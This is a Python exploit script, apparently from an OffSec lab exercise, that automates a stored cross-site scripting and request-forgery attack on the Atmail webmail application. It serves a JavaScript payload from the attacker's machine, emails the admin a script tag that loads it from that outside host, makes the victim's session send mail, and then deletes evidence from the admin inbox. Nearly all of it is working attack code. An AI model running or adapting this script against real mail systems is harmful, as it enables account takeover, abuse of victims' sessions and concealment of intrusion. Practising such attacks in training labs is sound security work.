#https://stackoverflow.com/questions/375427/a-non-blocking-read-on-a-subprocess-pipe-in-python
import os
import subprocess
import netifaces as ni
import sys
from threading  import Thread

try:
    from queue import Queue, Empty
except ImportError:
    from Queue import Queue, Empty  # python 2.x

ON_POSIX = 'posix' in sys.builtin_module_names

def enqueue_output(out, queue):
    for line in iter(out.readline, b''):
        queue.put(line)
    out.close()

if __name__ == "__main__":
    cwd = os.getcwd()
    attacker_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    #1. Start up webserver
    webserver = subprocess.Popen(["python", "-m" "http.server", "80"], stderr=subprocess.PIPE, close_fds=ON_POSIX)
    q = Queue()
    t = Thread(target=enqueue_output, args=(webserver.stderr, q))
    t.daemon = True # thread dies with the program
    t.start()
    # 2. CSRF Create a JavaScript file on our attacking server that will be called by the tag described in step 1 
    fp = open('atmail-sendmail-xhr.js1', 'w')
    payload = 'var email   = "attacker@offsec.local";var subject = "hacked!";var message = "This is a test email!";function send_email(){var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1";var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message;xhr = new XMLHttpRequest();xhr.open("GET", uri + query_string, true);xhr.send(null);}send_email();'
    fp.write(payload)
    fp.close()
    # 3. Send an email to admin@offsec.local with a malicious payload in the Date field, that references a JavaScript file on our attacking server
    script = cwd + "/" + "atmail_sendemail.py"
    target = "atmail"
    payload = "<script src='http://" + attacker_ip + "/atmail-sendmail-xhr.js'></script>"
    status = subprocess.call([script, target, payload])
    if(status != 0):
        print("error sending mail",status)
    # 4. Wait for admin to login
    line = ''
    try: # read line without blocking
        #line = q.get_nowait() # or q.get(timeout=.1)
        line = q.get(timeout=15).decode('utf-8')
        print("here: "+ line)
        
        if 'GET /atmail-sendmail-xhr.js' in line:
            print('Recieved request for crsf payload')
            webserver.kill()
    except Empty:
        print('Did not receive request for crsf payload')
    finally:
        webserver.terminate()
    # 5. Cleanup our tracks
    script = cwd + "/" + "clean_admin_inbox.py"
    target = "atmail"
    status = subprocess.call([script, target])
    if(status != 0):
        print("error cleaning up our tracks:",status)
    # 6 Check our mailbox
    